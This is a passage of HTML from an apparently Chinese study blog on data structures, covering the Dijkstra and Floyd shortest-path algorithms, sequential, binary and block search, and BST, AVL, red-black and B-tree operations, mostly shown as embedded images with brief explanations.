                     data-src="/./../../images/%E9%81%97%E6%BC%8F%E9%97%AE%E9%A2%98%E8%A7%A3%E7%AD%94/image-20241015005350067.png"
                      alt="image-20241015005350067"
                ></p>
<p>2、遍历所有结点，找到还没有确定最短路径的点，且其dist值最小的点，将其标记为找到最短路径了</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E9%81%97%E6%BC%8F%E9%97%AE%E9%A2%98%E8%A7%A3%E7%AD%94/image-20241015005845139.png"
                      alt="image-20241015005845139"
                ></p>
<p>3、检查所有邻接自V的顶点，若其 final 值为false,则更新 dist 和 path 信息</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E9%81%97%E6%BC%8F%E9%97%AE%E9%A2%98%E8%A7%A3%E7%AD%94/image-20241015005944334.png"
                      alt="image-20241015005944334"
                ></p>
<p>4、遍历所有结点，找到还没有确定最短路径的点，且其dist值最小的点，将其标记为找到最短路径了</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E9%81%97%E6%BC%8F%E9%97%AE%E9%A2%98%E8%A7%A3%E7%AD%94/image-20241015010038493.png"
                      alt="image-20241015010038493"
                ></p>
<p>5、检查所有邻接自V的顶点，若其 final 值为false,则更新 dist 和 path 信息</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E9%81%97%E6%BC%8F%E9%97%AE%E9%A2%98%E8%A7%A3%E7%AD%94/image-20241015010118386.png"
                      alt="image-20241015010118386"
                ></p>
<p>6、遍历所有结点，找到还没有确定最短路径的点，且其dist值最小的点，将其标记为找到最短路径了</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E9%81%97%E6%BC%8F%E9%97%AE%E9%A2%98%E8%A7%A3%E7%AD%94/image-20241015010144200.png"
                      alt="image-20241015010144200"
                ></p>
<p>7、检查所有邻接自V的顶点，若其 final 值为false,则更新 dist 和 path 信息</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E9%81%97%E6%BC%8F%E9%97%AE%E9%A2%98%E8%A7%A3%E7%AD%94/image-20241015010203220.png"
                      alt="image-20241015010203220"
                ></p>
<p>8、遍历所有结点，找到还没有确定最短路径的点，且其dist值最小的点，将其标记为找到最短路径了</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E9%81%97%E6%BC%8F%E9%97%AE%E9%A2%98%E8%A7%A3%E7%AD%94/image-20241015010226097.png"
                      alt="image-20241015010226097"
                ></p>
<p><strong>算法结束</strong></p>
<h4 id="代码实现-3"><a href="#代码实现-3" class="headerlink" title="代码实现"></a>代码实现</h4><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E9%81%97%E6%BC%8F%E9%97%AE%E9%A2%98%E8%A7%A3%E7%AD%94/image-20241015010352720.png"
                      alt="image-20241015010352720"
                ></p>
<h4 id="时间复杂度-3"><a href="#时间复杂度-3" class="headerlink" title="时间复杂度"></a>时间复杂度</h4><p>与Prim算法类似</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E9%81%97%E6%BC%8F%E9%97%AE%E9%A2%98%E8%A7%A3%E7%AD%94/image-20241015004933257.png"
                      alt="image-20241015004933257"
                ></p>
<h4 id="局限性-1"><a href="#局限性-1" class="headerlink" title="局限性"></a>局限性</h4><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E9%81%97%E6%BC%8F%E9%97%AE%E9%A2%98%E8%A7%A3%E7%AD%94/image-20241015005141879.png"
                      alt="image-20241015005141879"
                ></p>
<hr>
<h3 id="Floyd算法（弗洛伊德算法——动态规划）"><a href="#Floyd算法（弗洛伊德算法——动态规划）" class="headerlink" title="Floyd算法（弗洛伊德算法——动态规划）"></a>Floyd算法（弗洛伊德算法——动态规划）</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E9%81%97%E6%BC%8F%E9%97%AE%E9%A2%98%E8%A7%A3%E7%AD%94/image-20241015010522668.png"
                      alt="image-20241015010522668"
                ></p>
<h4 id="图示例-2"><a href="#图示例-2" class="headerlink" title="图示例"></a>图示例</h4><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E9%81%97%E6%BC%8F%E9%97%AE%E9%A2%98%E8%A7%A3%E7%AD%94/image-20241015011230339.png"
                      alt="image-20241015011230339"
                ></p>
<h4 id="代码实现-4"><a href="#代码实现-4" class="headerlink" title="代码实现"></a>代码实现</h4><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E9%81%97%E6%BC%8F%E9%97%AE%E9%A2%98%E8%A7%A3%E7%AD%94/image-20241015011405355.png"
                      alt="image-20241015011405355"
                ></p>
<h4 id="时间、空间复杂度"><a href="#时间、空间复杂度" class="headerlink" title="时间、空间复杂度"></a>时间、空间复杂度</h4><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E9%81%97%E6%BC%8F%E9%97%AE%E9%A2%98%E8%A7%A3%E7%AD%94/image-20241015011426396.png"
                      alt="image-20241015011426396"
                ></p>
<hr>
<h3 id="比较-2"><a href="#比较-2" class="headerlink" title="比较"></a>比较</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E9%81%97%E6%BC%8F%E9%97%AE%E9%A2%98%E8%A7%A3%E7%AD%94/image-20241015011520661.png"
                      alt="image-20241015011520661"
                ></p>
<h2 id="查找算法与数据结构"><a href="#查找算法与数据结构" class="headerlink" title="查找算法与数据结构"></a>查找算法与数据结构</h2><h3 id="ASL概念"><a href="#ASL概念" class="headerlink" title="ASL概念"></a>ASL概念</h3><h4 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h4><p><strong>查找算法的评价指标</strong></p>
<h4 id="查找成功"><a href="#查找成功" class="headerlink" title="查找成功"></a>查找成功</h4><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241015234132897.png"
                      alt="image-20241015234132897"
                ></p>
<h4 id="查找失败"><a href="#查找失败" class="headerlink" title="查找失败"></a>查找失败</h4><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241015234213068.png"
                      alt="image-20241015234213068"
                ></p>
<hr>
<h3 id="顺序查找"><a href="#顺序查找" class="headerlink" title="顺序查找"></a>顺序查找</h3><h4 id="原理-4"><a href="#原理-4" class="headerlink" title="原理"></a>原理</h4><p>顺序查找，又叫“线性查找”，通常用于线性表。<br>就是将整个数据结构进行遍历，从头到尾或者从尾到头</p>
<h4 id="代码实现-5"><a href="#代码实现-5" class="headerlink" title="代码实现"></a>代码实现</h4><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241015233118807.png"
                      alt="image-20241015233118807"
                ></p>
<h4 id="算法优化-1"><a href="#算法优化-1" class="headerlink" title="算法优化"></a>算法优化</h4><h5 id="原理-5"><a href="#原理-5" class="headerlink" title="原理"></a>原理</h5><p>设置“哨兵”元素，无需判断是否越界，执行效率更高</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241015233500830.png"
                      alt="image-20241015233500830"
                ></p>
<h5 id="代码实现-6"><a href="#代码实现-6" class="headerlink" title="代码实现"></a>代码实现</h5><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241015233405791.png"
                      alt="image-20241015233405791"
                ></p>
<h4 id="ASL"><a href="#ASL" class="headerlink" title="ASL"></a>ASL</h4><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241015233612606.png"
                      alt="image-20241015233612606"
                ></p>
<h4 id="顺序查找有序表优化"><a href="#顺序查找有序表优化" class="headerlink" title="顺序查找有序表优化"></a>顺序查找有序表优化</h4><h5 id="原理-6"><a href="#原理-6" class="headerlink" title="原理"></a>原理</h5><p>对有序表进行的顺序查找</p>
<h5 id="ASL-1"><a href="#ASL-1" class="headerlink" title="ASL"></a>ASL</h5><p><strong>查找失败</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241015235050753.png"
                      alt="image-20241015235050753"
                ></p>
<p><strong>查找成功</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241015235114678.png"
                      alt="image-20241015235114678"
                ></p>
<h4 id="顺序查找被查概率不相等优化"><a href="#顺序查找被查概率不相等优化" class="headerlink" title="顺序查找被查概率不相等优化"></a>顺序查找被查概率不相等优化</h4>
  <div class="note p-4 mb-4 rounded-small info">
    <p>查找失败也是从头到尾全部遍历——根据实际应用查找的情况来考虑</p>

  </div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241015235547535.png"
                      alt="image-20241015235547535"
                ></p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241015235731665.png"
                      alt="image-20241015235731665"
                ></p>
<hr>
<h3 id="折半查找（二分查找）"><a href="#折半查找（二分查找）" class="headerlink" title="折半查找（二分查找）"></a>折半查找（二分查找）</h3><h4 id="原理-7"><a href="#原理-7" class="headerlink" title="原理"></a>原理</h4><p>对半砍来查找，但只适用于有顺序的，不然无法进行二分查找</p>
<p>简单来说就是<strong>数字炸弹</strong></p>
<p>例：找78-&gt;<code>0~100(50)-&gt;50~100(75)-&gt;75~100(87)-&gt;75~87(81)-&gt;75-&gt;81(78)-&gt;78</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241016000343108.png"
                      alt="image-20241016000343108"
                ></p>
<h4 id="折半查找判定树"><a href="#折半查找判定树" class="headerlink" title="折半查找判定树"></a>折半查找判定树</h4><h5 id="性质"><a href="#性质" class="headerlink" title="性质"></a>性质</h5><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241016001133712.png"
                      alt="image-20241016001133712"
                ></p>
<h5 id="失败结点"><a href="#失败结点" class="headerlink" title="失败结点"></a>失败结点</h5><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241016001221740.png"
                      alt="image-20241016001221740"
                ></p>
<h5 id="ASL-2"><a href="#ASL-2" class="headerlink" title="ASL"></a>ASL</h5><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241016001323297.png"
                      alt="image-20241016001323297"
                ></p>
<h4 id="代码实现-7"><a href="#代码实现-7" class="headerlink" title="代码实现"></a>代码实现</h4><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241016000736311.png"
                      alt="image-20241016000736311"
                ></p>
<h4 id="ASL-3"><a href="#ASL-3" class="headerlink" title="ASL"></a>ASL</h4><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241016000828138.png"
                      alt="image-20241016000828138"
                ></p>
<h4 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h4><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241016001347343.png"
                      alt="image-20241016001347343"
                ></p>
<hr>
<h3 id="分块查找"><a href="#分块查找" class="headerlink" title="分块查找"></a>分块查找</h3><h4 id="原理-8"><a href="#原理-8" class="headerlink" title="原理"></a>原理</h4>
  <div class="note p-4 mb-4 rounded-small info">
    <p>将需要查找的原始表进行分块，构造索引表</p>

  </div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241016001902659.png"
                      alt="image-20241016001902659"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241016002645953.png"
                      alt="image-20241016002645953"
                ></p>
<h4 id="ASL-4"><a href="#ASL-4" class="headerlink" title="ASL"></a>ASL</h4><h5 id="已知情况"><a href="#已知情况" class="headerlink" title="已知情况"></a>已知情况</h5><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241016003320841.png"
                      alt="image-20241016003320841"
                ></p>
<h5 id="未知情况"><a href="#未知情况" class="headerlink" title="未知情况"></a>未知情况</h5><p><strong>顺序查找常考</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241016003359815.png"
                      alt="image-20241016003359815"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241016003410658.png"
                      alt="image-20241016003410658"
                ></p>
<h4 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h4><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241016003511188.png"
                      alt="image-20241016003511188"
                ></p>
<hr>
<h3 id="BST（二叉排序树）"><a href="#BST（二叉排序树）" class="headerlink" title="BST（二叉排序树）"></a>BST（二叉排序树）</h3><h4 id="概念-1"><a href="#概念-1" class="headerlink" title="概念"></a>概念</h4><p>一个二叉树满足<code>左子树结点数值&lt;根结点数值&lt;右子树结点数值</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241016003829552.png"
                      alt="image-20241016003829552"
                ></p>
<h4 id="查找操作"><a href="#查找操作" class="headerlink" title="查找操作"></a>查找操作</h4><h5 id="非递归代码实现"><a href="#非递归代码实现" class="headerlink" title="非递归代码实现"></a>非递归代码实现</h5><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241016004213562.png"
                      alt="image-20241016004213562"
                ></p>
<h5 id="递归代码实现"><a href="#递归代码实现" class="headerlink" title="递归代码实现"></a>递归代码实现</h5><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241016004335732.png"
                      alt="image-20241016004335732"
                ></p>
<h5 id="比较-3"><a href="#比较-3" class="headerlink" title="比较"></a>比较</h5><p>由于递归调用函数会在函数调用栈里面多分配空间，会浪费更多空间，所以一般使用非递归调用</p>
<h4 id="插入操作"><a href="#插入操作" class="headerlink" title="插入操作"></a>插入操作</h4><p><strong>插入后的新结点一定是叶子结点</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241016004701665.png"
                      alt="image-20241016004701665"
                ></p>
<h4 id="删除操作"><a href="#删除操作" class="headerlink" title="删除操作"></a>删除操作</h4><h5 id="删除结点为叶子结点"><a href="#删除结点为叶子结点" class="headerlink" title="删除结点为叶子结点"></a>删除结点为叶子结点</h5><p><strong>直接删除，不会破坏二叉排序树的性质</strong></p>
<h5 id="删除结点只有一棵左子树或者右子树"><a href="#删除结点只有一棵左子树或者右子树" class="headerlink" title="删除结点只有一棵左子树或者右子树"></a>删除结点只有一棵左子树或者右子树</h5><p><strong>让z的子树成为z父结点的子树，替代z的位置</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241016005357333.png"
                      alt="image-20241016005357333"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241016005406555.png"
                      alt="image-20241016005406555"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241016005420708.png"
                      alt="image-20241016005420708"
                ></p>
<h5 id="删除结点有左右子树"><a href="#删除结点有左右子树" class="headerlink" title="删除结点有左右子树"></a>删除结点有左右子树</h5><p><strong>若结点z有左、右两棵子树，则令z的直接后继(或直接前驱)替代z然后从二叉排序树中删去这个直接后继(或直接前驱)，这样就转换成了第一或第二种情况</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241016011204188.png"
                      alt="image-20241016011204188"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241016011348911.png"
                      alt="image-20241016011348911"
                ></p>
<h4 id="ASL-5"><a href="#ASL-5" class="headerlink" title="ASL"></a>ASL</h4><h5 id="查找成功-1"><a href="#查找成功-1" class="headerlink" title="查找成功"></a>查找成功</h5><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241016011515718.png"
                      alt="image-20241016011515718"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241016011608949.png"
                      alt="image-20241016011608949"
                ></p>
<h5 id="查找失败-1"><a href="#查找失败-1" class="headerlink" title="查找失败"></a>查找失败</h5><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241016011728126.png"
                      alt="image-20241016011728126"
                ></p>
<h4 id="总结-3"><a href="#总结-3" class="headerlink" title="总结"></a>总结</h4><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241016011749147.png"
                      alt="image-20241016011749147"
                ></p>
<hr>
<h3 id="AVL（平衡二叉树）"><a href="#AVL（平衡二叉树）" class="headerlink" title="AVL（平衡二叉树）"></a>AVL（平衡二叉树）</h3><h4 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h4><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241016141027788.png"
                      alt="image-20241016141027788"
                ></p>
<h4 id="调整最小不平衡二叉树"><a href="#调整最小不平衡二叉树" class="headerlink" title="调整最小不平衡二叉树"></a>调整最小不平衡二叉树</h4><h5 id="LL（左孩子右上旋）"><a href="#LL（左孩子右上旋）" class="headerlink" title="LL（左孩子右上旋）"></a>LL（左孩子右上旋）</h5><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241016141206656.png"
                      alt="image-20241016141206656"
                ></p>
<h5 id="RR（右孩子左上旋）"><a href="#RR（右孩子左上旋）" class="headerlink" title="RR（右孩子左上旋）"></a>RR（右孩子左上旋）</h5><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241016141238767.png"
                      alt="image-20241016141238767"
                ></p>
<h5 id="LR（左孩子的右孩子先左上旋再右上旋）"><a href="#LR（左孩子的右孩子先左上旋再右上旋）" class="headerlink" title="LR（左孩子的右孩子先左上旋再右上旋）"></a>LR（左孩子的右孩子先左上旋再右上旋）</h5><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241016141359300.png"
                      alt="image-20241016141359300"
                ></p>
<h5 id="RL（右孩子的左孩子先右上旋再左上旋）"><a href="#RL（右孩子的左孩子先右上旋再左上旋）" class="headerlink" title="RL（右孩子的左孩子先右上旋再左上旋）"></a>RL（右孩子的左孩子先右上旋再左上旋）</h5><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241016141440006.png"
                      alt="image-20241016141440006"
                ></p>
<h5 id="代码实现-8"><a href="#代码实现-8" class="headerlink" title="代码实现"></a>代码实现</h5><p><strong>LL与RR</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241016141307309.png"
                      alt="image-20241016141307309"
                ></p>
<h5 id="总结-4"><a href="#总结-4" class="headerlink" title="总结"></a>总结</h5><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241016141828444.png"
                      alt="image-20241016141828444"
                ></p>
<h4 id="平衡二叉树的删除"><a href="#平衡二叉树的删除" class="headerlink" title="平衡二叉树的删除"></a>平衡二叉树的删除</h4><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241016142630111.png"
                      alt="image-20241016142630111"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241016142751853.png"
                      alt="image-20241016142751853"
                ></p>
<h4 id="ASL-6"><a href="#ASL-6" class="headerlink" title="ASL"></a>ASL</h4><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241016141805536.png"
                      alt="image-20241016141805536"
                ></p>
<hr>
<h3 id="RBT（红黑树）"><a href="#RBT（红黑树）" class="headerlink" title="RBT（红黑树）"></a>RBT（红黑树）</h3><h4 id="区别"><a href="#区别" class="headerlink" title="区别"></a>区别</h4><p><strong>红黑树更适合需要频繁进行修改的场景</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241016143209908.png"
                      alt="image-20241016143209908"
                ></p>
<h4 id="定义-1"><a href="#定义-1" class="headerlink" title="定义"></a>定义</h4><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241016143259508.png"
                      alt="image-20241016143259508"
                ></p>
<h4 id="性质-1"><a href="#性质-1" class="headerlink" title="性质"></a>性质</h4><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241016143335964.png"
                      alt="image-20241016143335964"
                ></p>
<h4 id="时间复杂度-4"><a href="#时间复杂度-4" class="headerlink" title="时间复杂度"></a>时间复杂度</h4><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241016143354271.png"
                      alt="image-20241016143354271"
                ></p>
<h4 id="插入操作-1"><a href="#插入操作-1" class="headerlink" title="插入操作"></a>插入操作</h4><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241016143432781.png"
                      alt="image-20241016143432781"
                ></p>

  <div class="note-large info">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>提示</p>

    </div>
    <div class="notel-content">
      <p><strong>染色对应前面的具体结点</strong></p>
<p>比如父换爷＋染色——对应就是原本的父节点和爷结点进行染色</p>
<p><strong>变新</strong>意思为将该叔结点经过染色后再当做是新插入的结点再将其以插入操作从上到下进行操作</p>

    </div>
  </div>

<h4 id="总结-5"><a href="#总结-5" class="headerlink" title="总结"></a>总结</h4><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241016143850696.png"
                      alt="image-20241016143850696"
                ></p>
<h3 id="B树"><a href="#B树" class="headerlink" title="B树"></a>B树</h3><h4 id="定义-2"><a href="#定义-2" class="headerlink" title="定义"></a>定义</h4><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241016232030976.png"
                      alt="image-20241016232030976"
                ></p>
<h4 id="特征性质"><a href="#特征性质" class="headerlink" title="特征性质"></a>特征性质</h4><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241016234113590.png"
                      alt="image-20241016234113590"
                ></p>
<h4 id="高度范围"><a href="#高度范围" class="headerlink" title="高度范围"></a>高度范围</h4><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241016234133167.png"
                      alt="image-20241016234133167"
                ></p>
<h4 id="插入操作-2"><a href="#插入操作-2" class="headerlink" title="插入操作"></a>插入操作</h4><h5 id="前提要求"><a href="#前提要求" class="headerlink" title="前提要求"></a>前提要求</h5><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241017000028731.png"
                      alt="image-20241017000028731"
                ></p>
<h5 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h5><p>1、通过B树的查找，确定插入的位置，只能是终端节点</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241017000116578.png"
                      alt="image-20241017000116578"
                ></p>
<p>2、若关键字个数超出范围，则将中间位置（<code>[m/2]</code>向上取整）向上提，其后面的关键字放到新的结点中去</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241017000320572.png"
                      alt="image-20241017000320572"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241017000348610.png"
                      alt="image-20241017000348610"
                ></p>
<p>3、若父节点的关键字个数超了，也同上一样提中间数其后关键字放新结点</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
